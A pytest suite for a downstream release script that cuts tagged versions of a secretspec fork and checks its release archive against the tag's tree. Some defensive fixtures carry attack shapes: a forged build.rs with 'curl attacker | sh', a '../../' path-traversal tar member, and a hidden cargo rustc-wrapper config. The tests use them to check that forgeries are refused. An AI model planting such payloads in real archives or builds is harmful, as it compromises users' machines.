"""Focused tests for the downstream release helper; never touch the network."""

from __future__ import annotations

import ast
import hashlib
import importlib.util
import io
import json
import os
import re
import subprocess
import sys
import tarfile
import types
import urllib.error
from pathlib import Path

import pytest

ROOT = Path(__file__).resolve().parents[2]
RELEASE_PY = ROOT / "packaging" / "release.py"


def load_release():
    spec = importlib.util.spec_from_file_location("sudo_secretspec_release", RELEASE_PY)
    assert spec and spec.loader
    module = importlib.util.module_from_spec(spec)
    sys.modules[spec.name] = module
    spec.loader.exec_module(module)
    return module


@pytest.fixture
def release():
    return load_release()


@pytest.fixture
def cut(release):
    """The release this checkout is stamped at, so a version bump is inert here."""
    return workspace_release(release)


def completed(argv, stdout="", returncode=0):
    return subprocess.CompletedProcess(argv, returncode, stdout=stdout, stderr="")


def workspace_release(release):
    """The release the checked-in workspace version corresponds to.

    `preflight` reads the real `Cargo.toml`, so the tests have to agree with
    whatever it is stamped at. Deriving it keeps a version bump from breaking
    tests that are not about the version.
    """
    text = (ROOT / "Cargo.toml").read_text(encoding="utf-8")
    match = re.search(r'version = "(\d+\.\d+\.\d+-sudo\.\d+)"', text)
    assert match, "workspace Cargo.toml is not stamped with a downstream version"
    return release.parse_release(match.group(1))


# The git half of a passing preflight; each test supplies its own `gh` response.
PREFLIGHT_GIT_OUTPUTS = {
    ("git", "status", "--porcelain"): "",
    ("git", "branch", "--show-current"): "sudo-main\n",
    (
        "git",
        "remote",
        "get-url",
        "origin",
    ): "https://github.com/frdminc/sudo-secretspec.git\n",
    (
        "git",
        "remote",
        "get-url",
        "upstream",
    ): "https://github.com/cachix/secretspec.git\n",
    ("git", "rev-parse", "v0.19.1^{commit}"): "abc\n",
    ("git", "merge-base", "--is-ancestor", "v0.19.1", "HEAD"): "",
    ("git", "show", "v0.19.1:Cargo.toml"): '[workspace.package]\nversion = "0.19.1"\n',
}


def test_release_identity_is_derived_from_the_serial(release, cut):
    cut = release.parse_release("0.19.1-sudo.5")
    assert cut.serial == 5
    assert cut.version == "0.19.1-sudo.5"
    assert cut.tag == "v0.19.1-sudo.5"
    assert cut.title == "SecretSpec 0.19.1 — sudo-secretspec downstream 5"
    assert cut.archive_url == (
        "https://github.com/frdminc/sudo-secretspec/archive/refs/tags/"
        "v0.19.1-sudo.5.tar.gz"
    )


def test_only_downstream_versions_on_the_pinned_upstream_base_are_accepted(release):
    # The upstream base stays a constant: rebasing onto a new upstream tag is a
    # separate decision, not something a --version argument may do implicitly.
    for bad in (
        "0.20.0-sudo.1",
        "0.19.1",
        "v0.19.1-sudo.1",
        "0.19.1-sudo.0",
        "0.19.1-sudo.01",
        "0.19.1-other.1",
        # The pre-rename spelling is no longer a version this script may cut.
        # It still has to be *recognized* when restamping a formula, which is
        # ANY_VERSION_RE's job, not parse_release's.
        "0.19.1-djbclark.4",
        "",
    ):
        with pytest.raises(release.ReleaseError):
            release.parse_release(bad)


def test_https_release_url_guard(release):
    release.validate_release_url(
        "https://github.com/frdminc/sudo-secretspec/archive/refs/tags/v0.19.1-sudo.1.tar.gz"
    )
    for url in ("http://github.com/x", "file:///tmp/x", "https://example.com/x"):
        with pytest.raises(release.ReleaseError):
            release.validate_release_url(url)


def test_formula_rewrite_restamps_every_version_site(tmp_path: Path, release, cut):
    # Rewriting only the `url` shipped a formula that fetched the new tarball
    # while declaring and asserting the previous version, so `brew test` failed
    # after the tag and the GitHub Release were already published.
    formula = tmp_path / "sudo-secretspec.rb"
    formula.write_text(
        '  url "https://github.com/frdminc/sudo-secretspec/archive/refs/tags/'
        'v0.19.1-djbclark.1.tar.gz"\n'
        '  version "0.19.1-djbclark.1"\n'
        f'  sha256 "{"0" * 64}"\n'
        "  test do\n"
        '    assert_match "0.19.1-djbclark.1", shell_output("secretspec --version")\n'
        '    assert_match "sudo-secretspec 0.19.1-djbclark.1", shell_output("x")\n'
        "  end\n",
        encoding="utf-8",
    )
    cut = release.parse_release("0.19.1-sudo.5")

    release.rewrite_formula(formula, cut, "a" * 64)

    text = formula.read_text(encoding="utf-8")
    # The fixture is deliberately on the pre-rename spelling: a formula carried
    # across the djbclark -> sudo rename must be restamped, not left behind.
    assert "0.19.1-djbclark.1" not in text, text
    assert text.count("0.19.1-sudo.5") == release.FORMULA_VERSION_SITES
    assert f'url "{cut.archive_url}"' in text
    assert f'sha256 "{"a" * 64}"' in text


def test_formula_rewrite_refuses_an_unexpected_number_of_version_sites(
    tmp_path: Path, release
):
    formula = tmp_path / "sudo-secretspec.rb"
    formula.write_text(
        '  url "https://github.com/frdminc/sudo-secretspec/archive/refs/tags/'
        'v0.19.1-djbclark.1.tar.gz"\n'
        f'  sha256 "{"0" * 64}"\n',
        encoding="utf-8",
    )
    with pytest.raises(release.ReleaseError, match="version references"):
        release.rewrite_formula(
            formula, release.parse_release("0.19.1-sudo.5"), "a" * 64
        )


def test_the_real_formula_has_exactly_the_expected_version_sites(release):
    """The count `rewrite_formula` enforces must match the shipped formula.

    This is the regression test for the bug above: the explicit `version`
    stanza and the two `brew test` assertions were added to the formula long
    after the rewriter was written, and nothing tied the two together.
    """
    text = release.FORMULA.read_text(encoding="utf-8")
    assert len(release.ANY_VERSION_RE.findall(text)) == release.FORMULA_VERSION_SITES, (
        text
    )


def test_preflight_validates_branch_remotes_lineage_and_fork(monkeypatch, release):
    calls = []

    def fake_run(argv, **kwargs):
        calls.append(argv)
        key = tuple(argv)
        outputs = {
            ("git", "status", "--porcelain"): "",
            ("git", "branch", "--show-current"): "sudo-main\n",
            (
                "git",
                "remote",
                "get-url",
                "origin",
            ): "https://github.com/frdminc/sudo-secretspec.git\n",
            (
                "git",
                "remote",
                "get-url",
                "upstream",
            ): "https://github.com/cachix/secretspec.git\n",
            ("git", "rev-parse", "v0.19.1^{commit}"): "abc\n",
            ("git", "merge-base", "--is-ancestor", "v0.19.1", "HEAD"): "",
            (
                "git",
                "show",
                "v0.19.1:Cargo.toml",
            ): '[workspace.package]\nversion = "0.19.1"\n',
            (
                "gh",
                "repo",
                "view",
                "frdminc/sudo-secretspec",
                "--json",
                "nameWithOwner,parent,defaultBranchRef",
            ): json.dumps(
                {
                    "nameWithOwner": "frdminc/sudo-secretspec",
                    "parent": {"nameWithOwner": "cachix/secretspec"},
                    "defaultBranchRef": {"name": "sudo-main"},
                }
            ),
        }
        return completed(argv, outputs.get(key, ""))

    monkeypatch.setattr(release, "run", fake_run)
    release.preflight(workspace_release(release), allow_dirty=False)
    assert ["git", "merge-base", "--is-ancestor", "v0.19.1", "HEAD"] in calls


def test_preflight_refuses_a_serial_that_is_already_published(monkeypatch, release):
    """Catch a re-used serial before the tests run and a local tag exists.

    The remote is the authority, not the local tag list: a serial can have been
    published from another checkout entirely.
    """

    def fake_run(argv, **kwargs):
        if argv[:2] == ["git", "ls-remote"]:
            return completed(argv, "9f4c…\trefs/tags/v0.19.1-sudo.9\n")
        if argv[:4] == ["gh", "repo", "view", "frdminc/sudo-secretspec"]:
            return completed(
                argv,
                json.dumps(
                    {
                        "nameWithOwner": "frdminc/sudo-secretspec",
                        "parent": {"nameWithOwner": "cachix/secretspec"},
                        "defaultBranchRef": {"name": "sudo-main"},
                    }
                ),
            )
        return completed(argv, PREFLIGHT_GIT_OUTPUTS.get(tuple(argv), ""))

    monkeypatch.setattr(release, "run", fake_run)
    with pytest.raises(release.ReleaseError, match="already published"):
        release.preflight(workspace_release(release), allow_dirty=False)


def test_preflight_refuses_a_workspace_stamped_at_another_version(monkeypatch, release):
    def fake_run(argv, **kwargs):
        if argv[:4] == ["gh", "repo", "view", "frdminc/sudo-secretspec"]:
            return completed(
                argv,
                json.dumps(
                    {
                        "nameWithOwner": "frdminc/sudo-secretspec",
                        "parent": {"nameWithOwner": "cachix/secretspec"},
                        "defaultBranchRef": {"name": "sudo-main"},
                    }
                ),
            )
        return completed(argv, PREFLIGHT_GIT_OUTPUTS.get(tuple(argv), ""))

    monkeypatch.setattr(release, "run", fake_run)
    # A serial nobody will ever cut, so it cannot match the real Cargo.toml.
    with pytest.raises(release.ReleaseError, match="bump Cargo.toml"):
        release.preflight(release.parse_release("0.19.1-sudo.999"), allow_dirty=False)


def test_preflight_refuses_a_lockfile_that_disagrees_with_the_manifest(
    monkeypatch, release
):
    """The guard that v0.19.1-sudo.4 shipped without.

    That release bumped Cargo.toml and left Cargo.lock naming the previous
    version. The formula builds with `cargo install --locked`, so the published
    tag aborted before compiling anything. `cargo metadata --locked` is the
    cheapest way to ask, and asking in preflight means the failure lands before
    a tag exists rather than after it is public.
    """

    def fake_run(argv, **kwargs):
        if argv[:2] == ["cargo", "metadata"]:
            assert "--locked" in argv
            assert kwargs.get("check") is False, "must not raise past the guard"
            return completed(argv, returncode=101)
        if argv[:4] == ["gh", "repo", "view", "frdminc/sudo-secretspec"]:
            return completed(
                argv,
                json.dumps(
                    {
                        "nameWithOwner": "frdminc/sudo-secretspec",
                        "parent": {"nameWithOwner": "cachix/secretspec"},
                        "defaultBranchRef": {"name": "sudo-main"},
                    }
                ),
            )
        return completed(argv, PREFLIGHT_GIT_OUTPUTS.get(tuple(argv), ""))

    monkeypatch.setattr(release, "run", fake_run)
    with pytest.raises(release.ReleaseError, match="Cargo.lock is out of date"):
        release.preflight(workspace_release(release), allow_dirty=False)


def test_any_version_re_matches_both_downstream_spellings(release):
    """Restamping must recognize the pre-rename spelling as well as the current
    one, or a formula carried across the rename keeps its stale version."""
    assert release.ANY_VERSION_RE.findall(
        'url ".../v0.19.1-djbclark.3.tar.gz"\nversion "0.19.1-sudo.4"\n'
    ) == ["0.19.1-djbclark.3", "0.19.1-sudo.4"]


def test_parent_slug_accepts_every_gh_parent_shape(release):
    # gh 2.97 omits nameWithOwner inside parent and returns its parts instead.
    assert (
        release.parent_slug(
            {
                "parent": {
                    "id": "R_x",
                    "name": "secretspec",
                    "owner": {"login": "cachix"},
                }
            }
        )
        == "cachix/secretspec"
    )
    # Older/other versions supply the composed slug directly.
    assert (
        release.parent_slug({"parent": {"nameWithOwner": "cachix/secretspec"}})
        == "cachix/secretspec"
    )
    for repo in ({"parent": None}, {}, {"parent": {}}, {"parent": {"name": "x"}}):
        assert release.parent_slug(repo) is None


def test_preflight_accepts_gh_parent_without_name_with_owner(monkeypatch, release):
    def fake_run(argv, **kwargs):
        if argv[:4] == ["gh", "repo", "view", "frdminc/sudo-secretspec"]:
            return completed(
                argv,
                json.dumps(
                    {
                        "nameWithOwner": "frdminc/sudo-secretspec",
                        "parent": {
                            "id": "R_kgDOPHAtAA",
                            "name": "secretspec",
                            "owner": {"login": "cachix"},
                        },
                        "defaultBranchRef": {"name": "sudo-main"},
                    }
                ),
            )
        return completed(argv, PREFLIGHT_GIT_OUTPUTS.get(tuple(argv), ""))

    monkeypatch.setattr(release, "run", fake_run)
    release.preflight(workspace_release(release), allow_dirty=False)


def test_preflight_rejects_wrong_fork_parent(monkeypatch, release):
    def fake_run(argv, **kwargs):
        if argv[:4] == ["gh", "repo", "view", "frdminc/sudo-secretspec"]:
            return completed(
                argv,
                json.dumps(
                    {
                        "nameWithOwner": "frdminc/sudo-secretspec",
                        "parent": None,
                        "defaultBranchRef": {"name": "sudo-main"},
                    }
                ),
            )
        outputs = {
            ("git", "status", "--porcelain"): "",
            ("git", "branch", "--show-current"): "sudo-main\n",
            (
                "git",
                "remote",
                "get-url",
                "origin",
            ): "https://github.com/frdminc/sudo-secretspec.git\n",
            (
                "git",
                "remote",
                "get-url",
                "upstream",
            ): "https://github.com/cachix/secretspec.git\n",
            ("git", "rev-parse", "v0.19.1^{commit}"): "abc\n",
            ("git", "merge-base", "--is-ancestor", "v0.19.1", "HEAD"): "",
            (
                "git",
                "show",
                "v0.19.1:Cargo.toml",
            ): '[workspace.package]\nversion = "0.19.1"\n',
        }
        return completed(argv, outputs.get(tuple(argv), ""))

    monkeypatch.setattr(release, "run", fake_run)
    with pytest.raises(release.ReleaseError, match="parent"):
        release.preflight(workspace_release(release), allow_dirty=False)


def test_dry_run_lists_remote_actions_without_running(
    monkeypatch, release, capsys, cut
):
    monkeypatch.setattr(release, "preflight", lambda _release, **kwargs: None)
    monkeypatch.setattr(release, "run_tests", lambda **kwargs: None)
    assert release.main(["--version", cut.version, "--dry-run", "--skip-tests"]) == 0
    output = capsys.readouterr().out
    assert f"git tag -a {cut.tag}" in output
    assert f"git push origin {cut.tag}" in output
    assert "gh release create" in output
    assert "Formula/sudo-secretspec.rb" in output


def test_dry_run_still_validates_preflight(monkeypatch, release, cut):
    seen = []
    monkeypatch.setattr(
        release, "preflight", lambda _release, **kwargs: seen.append(kwargs) or None
    )
    monkeypatch.setattr(release, "run", lambda argv, **kwargs: completed(argv))
    assert release.main(["--version", cut.version, "--dry-run", "--skip-tests"]) == 0
    assert seen == [{"allow_dirty": False}]


def test_dry_run_aborts_when_preflight_fails(monkeypatch, release, cut):
    def boom(_release, **kwargs):
        raise release.ReleaseError("fork parent must be cachix/secretspec, got None")

    monkeypatch.setattr(release, "preflight", boom)
    with pytest.raises(release.ReleaseError, match="fork parent"):
        release.main(["--version", cut.version, "--dry-run", "--skip-tests"])


def test_verify_readback_accepts_gh_parent_without_name_with_owner(
    monkeypatch, release, cut
):
    def fake_run(argv, **kwargs):
        if argv[:3] == ["gh", "repo", "view"]:
            return completed(
                argv,
                json.dumps(
                    {
                        "nameWithOwner": release.FORK_REPO,
                        "parent": {"name": "secretspec", "owner": {"login": "cachix"}},
                    }
                ),
            )
        if argv[:3] == ["gh", "release", "view"]:
            return completed(
                argv,
                json.dumps(
                    {
                        "tagName": cut.tag,
                        "name": cut.title,
                        "isDraft": False,
                    }
                ),
            )
        if argv[:2] == ["gh", "api"]:
            return completed(argv, json.dumps({"ref": f"refs/tags/{cut.tag}"}))
        if argv[-1:] == ["--version"]:
            return completed(argv, f"secretspec {cut.version}\n")
        return completed(argv)

    monkeypatch.setattr(release, "run", fake_run)
    release.verify_readback(cut, "/opt/homebrew/opt/sudo-secretspec")


def test_verify_readback_checks_repo_tag_release_and_installed_version(
    monkeypatch, release, cut
):
    calls = []

    def fake_run(argv, **kwargs):
        calls.append(argv)
        if argv[:3] == ["gh", "repo", "view"]:
            return completed(
                argv,
                json.dumps(
                    {
                        "nameWithOwner": release.FORK_REPO,
                        "parent": {"nameWithOwner": release.UPSTREAM_REPO},
                    }
                ),
            )
        if argv[:3] == ["gh", "release", "view"]:
            return completed(
                argv,
                json.dumps(
                    {
                        "tagName": cut.tag,
                        "name": cut.title,
                        "isDraft": False,
                    }
                ),
            )
        if argv[:3] == [
            "gh",
            "api",
            f"repos/{release.FORK_REPO}/git/ref/tags/{cut.tag}",
        ]:
            return completed(argv, json.dumps({"ref": f"refs/tags/{cut.tag}"}))
        if argv[-1:] == ["--version"]:
            return completed(argv, f"secretspec {cut.version}\n")
        return completed(argv)

    monkeypatch.setattr(release, "run", fake_run)
    release.verify_readback(cut, "/opt/homebrew/opt/sudo-secretspec")
    assert any(argv[:3] == ["gh", "release", "view"] for argv in calls)
    assert any(argv[-1:] == ["--version"] for argv in calls)


def test_interruption_cleanup_removes_only_created_tag_and_formula_change(
    monkeypatch, release, cut
):
    calls = []
    monkeypatch.setattr(
        release, "run", lambda argv, **kwargs: calls.append(argv) or completed(argv)
    )
    state = release.CleanupState(
        tag_created=True, tag_pushed=False, formula_changed=True
    )
    release.cleanup_interrupted(cut, state)
    assert calls == [
        ["git", "tag", "-d", cut.tag],
        [
            "git",
            "restore",
            "--staged",
            "--worktree",
            "--",
            "packaging/homebrew/sudo-secretspec.rb",
        ],
    ]


def test_interruption_cleanup_never_deletes_pushed_tag(monkeypatch, release, cut):
    calls = []
    monkeypatch.setattr(
        release, "run", lambda argv, **kwargs: calls.append(argv) or completed(argv)
    )
    release.cleanup_interrupted(
        cut,
        release.CleanupState(tag_created=True, tag_pushed=True, formula_changed=False),
    )
    assert calls == []


class FakeResponse:
    """Minimal stand-in for the object `urlopen` returns as a context manager."""

    def __init__(
        self, payload: bytes, headers: dict | None = None, length: int | None = None
    ):
        self._payload = payload
        # Real responses always carry one; an empty mapping means "undeclared",
        # which is the branch that skips the short-body check.
        self.headers = headers or {}
        # `http.client` sets this only when it parsed the header itself.
        self.length = length

    def __enter__(self):
        return self

    def __exit__(self, *_exc):
        return False

    def read(self, _size):
        payload, self._payload = self._payload, b""
        return payload


def test_the_archive_fetch_survives_a_tarball_that_is_not_ready_yet(
    monkeypatch, release, cut
):
    # GitHub builds the source tarball on first request, and this fetch happens
    # after the tag and Release are published. Giving up on the first 404 sends
    # the operator down the by-hand resume path for a wait.
    import hashlib

    attempts = []
    slept = []

    def flaky(_request, timeout=None):
        attempts.append(timeout)
        if len(attempts) < 3:
            raise release.urllib.error.URLError("not found")
        return FakeResponse(b"tarball")

    monkeypatch.setattr(release._OPENER, "open", flaky)
    monkeypatch.setattr(release.time, "sleep", slept.append)

    assert (
        release.archive_sha256(cut, dry_run=False)
        == hashlib.sha256(b"tarball").hexdigest()
    )
    assert len(attempts) == 3
    # Backoff doubles rather than hammering a tag that is still being packed.
    assert slept == [
        release.ARCHIVE_BACKOFF_SECONDS,
        release.ARCHIVE_BACKOFF_SECONDS * 2,
    ]


def test_a_tarball_that_never_appears_names_the_by_hand_resume_path(
    monkeypatch, release, cut
):
    monkeypatch.setattr(
        release._OPENER,
        "open",
        lambda *_a, **_k: (_ for _ in ()).throw(release.urllib.error.URLError("gone")),
    )
    monkeypatch.setattr(release.time, "sleep", lambda _s: None)

    with pytest.raises(release.ReleaseError) as caught:
        release.archive_sha256(cut, dry_run=False)
    # The tag is already public at this point, so the message has to say so.
    assert "do not re-run" in str(caught.value)


def test_a_partial_download_does_not_poison_the_retry(monkeypatch, release, cut):
    # The hasher is rebuilt per attempt; a stream that dies mid-body has already
    # fed bytes to it, and reusing it would return a digest of retry + retry.
    import hashlib

    class HalfThenFail(FakeResponse):
        """Delivers a chunk, then dies -- the case that poisons a shared hasher."""

        def __init__(self):
            super().__init__(b"")
            self._served = False

        def read(self, _size):
            if not self._served:
                self._served = True
                return b"partial-"
            raise OSError("connection reset")

    responses = [HalfThenFail(), FakeResponse(b"tarball")]
    monkeypatch.setattr(release._OPENER, "open", lambda *_a, **_k: responses.pop(0))
    monkeypatch.setattr(release.time, "sleep", lambda _s: None)

    assert (
        release.archive_sha256(cut, dry_run=False)
        == hashlib.sha256(b"tarball").hexdigest()
    )


def test_a_failed_command_reports_what_it_printed(release):
    # Every command runs captured, so `str(error)` alone gives the exit status
    # and no reason -- which is what the operator sees when a release dies.
    error = subprocess.CalledProcessError(
        1, ["git", "push", "origin", "HEAD"], output="", stderr="remote: rejected\n"
    )
    described = release.describe(error)
    assert "git push origin HEAD" in described
    assert "remote: rejected" in described
    assert "exit 1" in described


def test_a_failed_command_with_only_stdout_still_explains_itself(release):
    error = subprocess.CalledProcessError(
        2, ["brew", "test", "x"], output="Error: no such keg\n", stderr=""
    )
    assert "no such keg" in release.describe(error)


OVERLAY = "a" * 40
TARGET = "b" * 40
CI_BRANCH = "ci/run/HEAD-bbbbbbbb"
PUSHED = (
    f"overlay {OVERLAY} for {TARGET} -> origin {CI_BRANCH}\n"
    f"pushed https://github.com/frdminc/sudo-secretspec/tree/{CI_BRANCH}\n"
)


def fake_ci(monkeypatch, release, *, runs, watch_rc=0, refs=None):
    """Script `github-ci-run`, `gh run list` (one reply per lookup) and `gh run watch`.

    `refs` maps a ref to what `git rev-parse` prints; a local ci/base is absent
    unless given.
    """
    calls = []
    replies = list(runs)
    refs = refs or {}

    def fake_run(argv, **kwargs):
        calls.append(argv)
        if argv[:2] == ["git", "rev-parse"]:
            ref = argv[-1]
            return completed(argv, refs.get(ref, ""), 0 if ref in refs else 1)
        if argv[0] == str(release.CI_WRAPPER):
            return completed(argv, PUSHED)
        if argv[:3] == ["gh", "run", "list"]:
            return completed(argv, json.dumps(replies.pop(0)))
        if argv[:3] == ["gh", "run", "watch"]:
            return completed(argv, returncode=watch_rc)
        return completed(argv)

    monkeypatch.setattr(release, "run", fake_run)
    monkeypatch.setattr(release.time, "sleep", lambda _s: None)
    return calls


def test_ci_gate_watches_the_run_for_its_own_overlay_commit(
    monkeypatch, release, capsys
):
    # The first lookup sees only an older run on the branch (a force-push reuses
    # the name); the gate must wait for the run of the overlay it just pushed.
    calls = fake_ci(
        monkeypatch,
        release,
        runs=[
            [{"databaseId": 1, "headSha": "c" * 40}],
            [{"databaseId": 7, "headSha": OVERLAY}],
        ],
    )
    release.ci_gate(dry_run=False)
    assert calls[0] == ["git", "fetch", "origin", "ci/base"]
    assert calls[2] == [str(release.CI_WRAPPER), "--no-wait", "HEAD"]
    assert ["gh", "run", "list", "-R", release.FORK_REPO, "--branch", CI_BRANCH] == (
        calls[3][:7]
    )
    assert calls[-1][:4] == ["gh", "run", "watch", "7"]
    assert "--exit-status" in calls[-1]
    assert "https://github.com/frdminc/sudo-secretspec/actions/runs/7" in (
        capsys.readouterr().out
    )


def test_ci_gate_refuses_a_red_run_and_names_it(monkeypatch, release):
    fake_ci(
        monkeypatch, release, runs=[[{"databaseId": 9, "headSha": OVERLAY}]], watch_rc=1
    )
    with pytest.raises(release.ReleaseError, match="actions/runs/9"):
        release.ci_gate(dry_run=False)


def _brew_info(linked_keg):
    return json.dumps({"formulae": [{"linked_keg": linked_keg}]})


# What GitHub's generated archive looks like: one prefixed directory of
# ordinary files, plus the commit id in the global pax header. Verified
# against the real v0.19.1-sudo.28 archive (749 members, one top-level entry
# `sudo-secretspec-0.19.1-sudo.28`, pax comment c31befc3...).
_ARCHIVE_FILES = {"README.md": b"readme\n", "src/main.rs": b"fn main() {}\n"}


def _tag_archive(path, commit, *, prefix=None, files=None, release=None):
    """A gzipped tar shaped like GitHub's generated archive for a tag."""
    headers = {"comment": commit} if commit else {}
    if prefix is None:
        prefix = "sudo-secretspec-0.0.0" if release is None else release.archive_prefix
    files = _ARCHIVE_FILES if files is None else files
    with tarfile.open(
        path, "w:gz", format=tarfile.PAX_FORMAT, pax_headers=headers
    ) as tf:
        for name, body in files.items():
            member = tarfile.TarInfo(f"{prefix}/{name}")
            member.size = len(body)
            tf.addfile(member, io.BytesIO(body))
    return path


def _tree_of(files=None):
    """The fingerprint `tree_entries` produces for `files`, without extracting."""
    files = _ARCHIVE_FILES if files is None else files
    entries = {}
    for name, body in files.items():
        entries[name] = ("100644", hashlib.sha256(body).hexdigest())
        # Intermediate directories are entries too, with no mode or digest of
        # their own -- `tree_entries` records only files and symlinks, so a
        # directory never appears. Nothing to add here; this comment is the
        # reason the dict looks flat.
    return entries


def test_archive_commit_reads_the_commit_github_embeds(release, tmp_path):
    """Verified against the real v0.19.1-sudo.28 archive, whose pax comment is
    c31befc3cb35bae1bb9431a58517dfb6ae6e04f4 -- the same value `git rev-parse`
    gives for the tag, and the same one the attestation used as --source-digest.
    """
    commit = "c" * 40
    assert release.archive_commit(_tag_archive(tmp_path / "a.tar.gz", commit)) == commit
    assert release.archive_commit(_tag_archive(tmp_path / "b.tar.gz", None)) is None
    (tmp_path / "junk.tar.gz").write_bytes(b"not a gzip stream")
    assert release.archive_commit(tmp_path / "junk.tar.gz") is None


class _ByteResponse(io.BytesIO):
    """An opener stand-in: a context manager over a fixed body."""

    def __init__(
        self, body: bytes, headers: dict | None = None, length: int | None = 0
    ):
        super().__init__(body)
        self.headers = (
            {"Content-Length": str(len(body))} if headers is None else headers
        )
        # `http.client` counts this down as the body is read, and leaves it
        # None whenever it did not parse a Content-Length of its own -- which
        # is the gate `archive_facts` reads.
        self.length = length

    def __enter__(self):
        return self

    def __exit__(self, *_a):
        return False


def _fake_archive_download(monkeypatch, release, body: bytes):
    monkeypatch.setattr(release._OPENER, "open", lambda *_a, **_k: _ByteResponse(body))


def _stub_tag_tree(monkeypatch, release, files=None):
    """`tag_tree` shells out to `git archive`; tests supply its answer."""
    monkeypatch.setattr(release, "tag_tree", lambda _r: _tree_of(files))


def test_a_forged_archive_with_the_genuine_commit_id_is_refused(
    monkeypatch, release, cut, tmp_path
):
    """1b: the pax comment is data *inside* the archive, so whoever produces
    the bytes chooses it. The reviewer proved a 25-line script could build an
    archive carrying a hostile build.rs and the real commit id, and it passed
    the commit check unchanged (adversary 1b, 2026-10-20). The tree comparison
    is what a forgery cannot pass.
    """
    commit = "a" * 40
    monkeypatch.setattr(release, "output", lambda *_a, **_k: commit)
    _stub_tag_tree(monkeypatch, release)

    forged = dict(_ARCHIVE_FILES)
    forged["build.rs"] = b"fn main() { /* curl attacker | sh */ }"
    body = _tag_archive(
        tmp_path / "forged.tar.gz", commit, release=cut, files=forged
    ).read_bytes()
    _fake_archive_download(monkeypatch, release, body)

    # It carries the genuine commit, so the accident check is satisfied.
    assert release.archive_commit(tmp_path / "forged.tar.gz") == commit
    with pytest.raises(release.ReleaseError) as caught:
        release.require_archive_matches_tag(cut, dry_run=False)
    message = str(caught.value)
    assert f"is not {cut.tag}'s tree" in message
    # The message has to name the file, because this failure lands after the
    # tag is published and the operator is deciding resume-by-hand vs breach.
    assert "build.rs" in message
    assert release.RESUME_BY_HAND_HINT in message


def test_a_changed_file_and_a_missing_file_are_both_caught(
    monkeypatch, release, cut, tmp_path
):
    """Content and absence, not just extra paths: `git archive` of the tag is
    the authority on all three."""
    commit = "a" * 40
    monkeypatch.setattr(release, "output", lambda *_a, **_k: commit)
    _stub_tag_tree(monkeypatch, release)

    changed = dict(_ARCHIVE_FILES, **{"src/main.rs": b"fn main() { evil() }\n"})
    dropped = {"README.md": _ARCHIVE_FILES["README.md"]}
    for name, files, expected in (
        ("changed", changed, "1 different (src/main.rs)"),
        ("dropped", dropped, "1 missing (src/main.rs)"),
    ):
        release._ARCHIVE_FACTS.clear()
        body = _tag_archive(
            tmp_path / f"{name}.tar.gz", commit, release=cut, files=files
        ).read_bytes()
        _fake_archive_download(monkeypatch, release, body)
        with pytest.raises(release.ReleaseError, match=re.escape(expected)):
            release.require_archive_matches_tag(cut, dry_run=False)


def test_the_archive_must_be_one_prefixed_directory(release, cut, tmp_path):
    """GitHub puts exactly one `<repo>-<version>/` directory in its archive.
    The prefix is computed locally, so it is a requirement the bytes meet, not
    a value they choose."""
    assert cut.archive_prefix == f"sudo-secretspec-{cut.version}"

    good = _tag_archive(tmp_path / "good.tar.gz", "a" * 40, release=cut)
    assert release.extracted_tree(good, prefix=cut.archive_prefix) == _tree_of()

    wrong = _tag_archive(tmp_path / "wrong.tar.gz", "a" * 40, prefix="elsewhere-1.0")
    assert release.extracted_tree(wrong, prefix=cut.archive_prefix) is None

    (tmp_path / "junk.tar.gz").write_bytes(b"not a gzip stream")
    assert release.extracted_tree(tmp_path / "junk.tar.gz", prefix="x") is None


def test_a_traversing_member_is_refused_not_written(release, tmp_path, monkeypatch):
    """`filter="data"` is the only thing stopping a `..` member from being
    written outside the destination, and this test is what has to prove the
    argument is load-bearing rather than decorative.

    Two earlier versions of this test proved nothing. Both asserted that
    `extracted_tree` returns None and that nothing new appeared under
    `tmp_path`, and both are TRUE DURING A REAL ESCAPE: `extracted_tree`
    extracts into a `tempfile.TemporaryDirectory()` under the system TMPDIR,
    so `../../escaped.txt` lands outside `tmp_path` entirely, and the
    destination is then empty -- which makes the single-root check return None
    for a reason that has nothing to do with any refusal. Removing
    `filter="data"` left the suite green while the write happened (adversary
    F2, 2026-10-23, mutation M2: 1 passed).

    Pointing `tempfile.tempdir` at a directory nested two levels under
    `tmp_path` is what closes it: `../../` from the destination now lands
    where the test is looking, so an escape is visible and the mutation
    fails.
    """
    nest = tmp_path / "dest" / "a" / "b"
    nest.mkdir(parents=True)
    monkeypatch.setattr(release.tempfile, "tempdir", str(nest))

    evil = tmp_path / "evil.tar.gz"
    with tarfile.open(evil, "w:gz") as tf:
        member = tarfile.TarInfo("../../escaped.txt")
        payload = b"written outside the destination\n"
        member.size = len(payload)
        tf.addfile(member, io.BytesIO(payload))

    before = set(tmp_path.rglob("*"))
    assert release.extracted_tree(evil, prefix="anything") is None
    assert set(tmp_path.rglob("*")) == before


def test_an_unlistable_directory_is_refused_not_silently_skipped(release, tmp_path):
    """`os.walk`'s default silently discards a directory it cannot list, and
    `tree_entries` records no directories -- so without `onerror` an
    unlistable directory and everything under it would vanish from the
    fingerprint, and a forged archive could hide a payload there. A `.cargo/`
    directory at mode 0o111 holding a `config.toml` with `rustc-wrapper` is
    build-time code execution that cargo reaches by exact name, with no
    visible `build.rs`.

    The archive path happens to be covered today only because the data filter
    normalises directory modes to 0o755, so the walk descends and the extra
    path is reported -- a CPython implementation detail, not a guarantee. This
    pins the walk itself (adversary F4, 2026-10-23).
    """
    root = tmp_path / "tree"
    (root / "hidden").mkdir(parents=True)
    (root / "hidden" / "config.toml").write_bytes(b'[build]\nrustc-wrapper = "x"\n')
    (root / "plain.txt").write_bytes(b"plain\n")
    (root / "hidden").chmod(0o111)
    try:
        with pytest.raises(OSError):
            release.tree_entries(root)
    finally:
        # Restore before tmp_path cleanup, which cannot remove it otherwise.
        (root / "hidden").chmod(0o755)


def test_a_tree_that_cannot_be_fingerprinted_fails_closed(
    release, cut, tmp_path, monkeypatch
):
    """`iterdir`, `is_dir` and `tree_entries` are inside `extracted_tree`'s
    `try`, not just `extractall`. They stat, readlink and read files, and
    `tree_entries` now raises on an unlistable directory by design, so an
    OSError from any of them would otherwise propagate out of `tag_tree`, out
    of `require_archive_matches_tag`, and reach the operator as a bare
    traceback with no resume path -- after the tag and the Release are public.
    That is the exact shape of the defect 9e1312e was written to fix
    (adversary F5, 2026-10-23).
    """

    def boom(_root):
        raise OSError("cannot stat")

    monkeypatch.setattr(release, "tree_entries", boom)
    archive = _tag_archive(tmp_path / "a.tar.gz", "a" * 40, release=cut)
    assert release.extracted_tree(archive, prefix=cut.archive_prefix) is None


